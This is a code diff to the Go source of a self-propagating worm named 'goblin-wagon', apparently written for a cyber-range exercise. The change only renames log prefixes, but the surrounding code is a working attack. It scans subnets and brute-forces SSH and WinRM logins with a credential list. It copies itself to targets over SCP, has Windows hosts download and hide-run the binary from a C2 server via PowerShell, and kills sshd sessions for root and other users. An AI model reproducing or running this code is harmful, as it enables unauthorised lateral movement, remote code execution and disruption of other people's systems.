@@ -51,7 +51,7 @@ func discover_hosts(subnet string) []string {
 			}
 
 			if err := cmd.Run(); err == nil {
-				log.Printf("[+] host alive: %s", target)
+				log.Printf("LOG_STATUS:    host alive: %s", target)
 				mu.Lock()
 				alive = append(alive, target)
 				mu.Unlock()
@@ -165,7 +165,7 @@ func spread() {
 	selfPath, _ := os.Executable()
 	selfData, err := os.ReadFile(selfPath)
 	if err != nil {
-		log.Printf("[-] could not read self: %v", err)
+		log.Printf("ERROR_LOG:   could not read self: %v", err)
 		return
 	}
 
@@ -183,54 +183,54 @@ func spread() {
 			// try WinRM with all creds
 			go func() {
 				for _, c := range creds {
-					log.Printf("[*] WinRM | %s | trying %s", ip, c.user)
+					log.Printf("EXEC_LOG:    WinRM | %s | trying %s", ip, c.user)
 					client, err := establish_winRM(ip, c.user, c.pass)
 					if err != nil {
-						log.Printf("[-] WinRM | %s | auth failed for %s: %v", ip, c.user, err)
+						log.Printf("ERROR_LOG:   WinRM | %s | auth failed for %s: %v", ip, c.user, err)
 						continue
 					}
 					// verify WinRM actually works by running a test command
 					if err := run_WinRM_cmds(client, "whoami"); err != nil {
-						log.Printf("[-] WinRM | %s | connection verify failed for %s: %v", ip, c.user, err)
+						log.Printf("ERROR_LOG:   WinRM | %s | connection verify failed for %s: %v", ip, c.user, err)
 						continue
 					}
-					log.Printf("[+] WinRM | %s | auth succeeded with %s", ip, c.user)
+					log.Printf("LOG_STATUS:    WinRM | %s | auth succeeded with %s", ip, c.user)
 					if err := drop_and_run_winrm(client, selfData, ip); err != nil {
-						log.Printf("[-] WinRM | %s | drop failed: %v", ip, err)
+						log.Printf("ERROR_LOG:   WinRM | %s | drop failed: %v", ip, err)
 						continue
 					}
 					done <- "winrm"
 					return
 				}
-				log.Printf("[-] WinRM | %s | all creds exhausted", ip)
+				log.Printf("ERROR_LOG:   WinRM | %s | all creds exhausted", ip)
 			}()
 
 			// try SSH with all creds
 			go func() {
 				for _, c := range creds {
-					log.Printf("[*] SSH | %s | trying %s", ip, c.user)
+					log.Printf("EXEC_LOG:    SSH | %s | trying %s", ip, c.user)
 					client, err := establish_SSH(ip, c.user, c.pass, c.key)
 					if err != nil {
-						log.Printf("[-] SSH | %s | auth failed for %s: %v", ip, c.user, err)
+						log.Printf("ERROR_LOG:   SSH | %s | auth failed for %s: %v", ip, c.user, err)
 						continue
 					}
-					log.Printf("[+] SSH | %s | auth succeeded with %s", ip, c.user)
+					log.Printf("LOG_STATUS:    SSH | %s | auth succeeded with %s", ip, c.user)
 					defer client.Close()
 					if err := drop_and_run_ssh(client, selfData, ip); err != nil {
-						log.Printf("[-] SSH | %s | drop failed: %v", ip, err)
+						log.Printf("ERROR_LOG:   SSH | %s | drop failed: %v", ip, err)
 						continue
 					}
 					done <- "ssh"
 					return
 				}
-				log.Printf("[-] SSH | %s | all creds exhausted", ip)
+				log.Printf("ERROR_LOG:   SSH | %s | all creds exhausted", ip)
 			}()
 
 			select {
 			case method := <-done:
-				log.Printf("[+] spread to %s succeeded via %s", ip, method)
+				log.Printf("LOG_STATUS:    spread to %s succeeded via %s", ip, method)
 			case <-time.After(30 * time.Second):
-				log.Printf("[-] spread to %s timed out", ip)
+				log.Printf("ERROR_LOG:   spread to %s timed out", ip)
 			}
 		}(host_ip)
 	}
@@ -238,14 +238,14 @@ func spread() {
 }
 
 func drop_and_run_ssh(client *ssh.Client, data []byte, ip string) error {
-	log.Printf("[*] SSH | %s | opening session for SCP drop", ip)
+	log.Printf("EXEC_LOG:    SSH | %s | opening session for SCP drop", ip)
 	session, err := client.NewSession()
 	if err != nil {
 		return err
 	}
 	defer session.Close()
 
-	log.Printf("[*] SSH | %s | writing %d bytes via SCP", ip, len(data))
+	log.Printf("EXEC_LOG:    SSH | %s | writing %d bytes via SCP", ip, len(data))
 	go func() {
 		w, _ := session.StdinPipe()
 		defer w.Close()
@@ -255,10 +255,10 @@ func drop_and_run_ssh(client *ssh.Client, data []byte, ip string) error {
 	}()
 
 	if err := session.Run("scp -t /tmp/goblin-wagon"); err != nil {
-		log.Printf("[-] SSH | %s | SCP transfer failed: %v", ip, err)
+		log.Printf("ERROR_LOG:   SSH | %s | SCP transfer failed: %v", ip, err)
 		return err
 	}
-	log.Printf("[+] SSH | %s | binary dropped to /tmp/goblin-wagon", ip)
+	log.Printf("LOG_STATUS:    SSH | %s | binary dropped to /tmp/goblin-wagon", ip)
 
 	// run payload
 	execSession, err := client.NewSession()
@@ -278,22 +278,22 @@ else
 fi
 `
 	if err := execSession.Run(runCmd); err != nil {
-		log.Printf("[-] SSH | %s | execution failed: %v", ip, err)
+		log.Printf("ERROR_LOG:   SSH | %s | execution failed: %v", ip, err)
 		return err
 	}
-	log.Printf("[+] SSH | %s | payload executing on target", ip)
+	log.Printf("LOG_STATUS:    SSH | %s | payload executing on target", ip)
 
 	// wait for wagon to finish then kill all sessions FROM OUTSIDE
 	time.Sleep(90 * time.Second)
 	killSession, err := client.NewSession()
 	if err != nil {
-		log.Printf("[-] SSH | %s | could not open kill session: %v", ip, err)
+		log.Printf("ERROR_LOG:   SSH | %s | could not open kill session: %v", ip, err)
 		return nil
 	}
 	defer killSession.Close()
-	log.Printf("[*] SSH | %s | killing all sessions", ip)
+	log.Printf("EXEC_LOG:    SSH | %s | killing all sessions", ip)
 	killSession.Run("pkill -9 -u cyberrange sshd; pkill -9 -u sjohnson sshd; pkill -9 -u root sshd")
-	log.Printf("[+] SSH | %s | sessions killed", ip)
+	log.Printf("LOG_STATUS:    SSH | %s | sessions killed", ip)
 
 	return nil
 }
@@ -302,7 +302,7 @@ func drop_and_run_winrm(client *winrm.Client, data []byte, ip string) error {
 	// serve the binary from your C2 and have target pull it
 	cmd := `powershell -Command "Invoke-WebRequest -Uri 'http://10.10.10.80/goblin-wagon.exe' -OutFile 'C:\Windows\Temp\goblin-wagon.exe'"`
 	if err := run_WinRM_cmds(client, cmd); err != nil {
-		log.Printf("[-] WinRM | %s | download failed: %v", ip, err)
+		log.Printf("ERROR_LOG:   WinRM | %s | download failed: %v", ip, err)
 		return err
 	}
 	return run_WinRM_cmds(client, `powershell -Command "Start-Process 'C:\Windows\Temp\goblin-wagon.exe' -WindowStyle Hidden"`)
@@ -319,12 +319,12 @@ var payload_windows_amd64 []byte
 
 func main() {
 	log.SetFlags(log.Ltime | log.Lshortfile)
-	log.Println("[*] goblin-wagon starting")
+	log.Println("EXEC_LOG:    goblin-wagon starting")
 
 	host_os := runtime.GOOS
 	arch := runtime.GOARCH
 
-	log.Printf("[*] detected OS: %s | Arch: %s", host_os, arch)
+	log.Printf("EXEC_LOG:    detected OS: %s | Arch: %s", host_os, arch)
 
 	payloads := map[Platform][]byte{
 		{OS: "linux", Arch: "amd64"}:   payload_linux_amd64,
@@ -333,14 +333,14 @@ func main() {
 	}
 
 	key := Platform{OS: host_os, Arch: arch}
-	log.Printf("[*] looking up platform key: %+v", key)
+	log.Printf("EXEC_LOG:    looking up platform key: %+v", key)
 
 	data, ok := payloads[key]
 	if !ok {
-		log.Printf("[-] no payload matched for OS=%s Arch=%s -- bailing", host_os, arch)
+		log.Printf("ERROR_LOG:   no payload matched for OS=%s Arch=%s -- bailing", host_os, arch)
 		return
 	}
-	log.Printf("[+] payload found, size: %d bytes", len(data))
+	log.Printf("LOG_STATUS:    payload found, size: %d bytes", len(data))
 
 	ext := ""
 	if host_os == "windows" {
@@ -349,43 +349,43 @@ func main() {
 
 	tmp, err := os.CreateTemp("", "svc*"+ext)
 	if err != nil {
-		log.Printf("[-] failed to create temp file: %v", err)
+		log.Printf("ERROR_LOG:   failed to create temp file: %v", err)
 		return
 	}
-	log.Printf("[*] temp file created: %s", tmp.Name())
+	log.Printf("EXEC_LOG:    temp file created: %s", tmp.Name())
 
 	n, err := tmp.Write(data)
 	if err != nil {
-		log.Printf("[-] failed to write payload to temp file: %v", err)
+		log.Printf("ERROR_LOG:   failed to write payload to temp file: %v", err)
 		return
 	}
-	log.Printf("[+] wrote %d bytes to temp file", n)
+	log.Printf("LOG_STATUS:    wrote %d bytes to temp file", n)
 	tmp.Close()
 
 	if err := os.Chmod(tmp.Name(), 0700); err != nil {
-		log.Printf("[-] chmod failed: %v", err)
+		log.Printf("ERROR_LOG:   chmod failed: %v", err)
 		return
 	}
-	log.Printf("[*] chmod 0700 applied")
+	log.Printf("EXEC_LOG:    chmod 0700 applied")
 
 	cmd := exec.Command(tmp.Name())
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
-	log.Printf("[*] executing payload: %s", tmp.Name())
+	log.Printf("EXEC_LOG:    executing payload: %s", tmp.Name())
 
 	if err := cmd.Run(); err != nil {
-		log.Printf("[-] payload execution failed: %v", err)
+		log.Printf("ERROR_LOG:   payload execution failed: %v", err)
 	} else {
-		log.Printf("[+] payload exited cleanly")
+		log.Printf("LOG_STATUS:    payload exited cleanly")
 	}
 
 	if err := os.Remove(tmp.Name()); err != nil {
-		log.Printf("[-] failed to remove temp file: %v", err)
+		log.Printf("ERROR_LOG:   failed to remove temp file: %v", err)
 	} else {
-		log.Printf("[*] temp file cleaned up")
+		log.Printf("EXEC_LOG:    temp file cleaned up")
 	}
 
-	log.Println("[*] goblin-wagon done")
+	log.Println("EXEC_LOG:    goblin-wagon done")
 
 	// spread()
 }
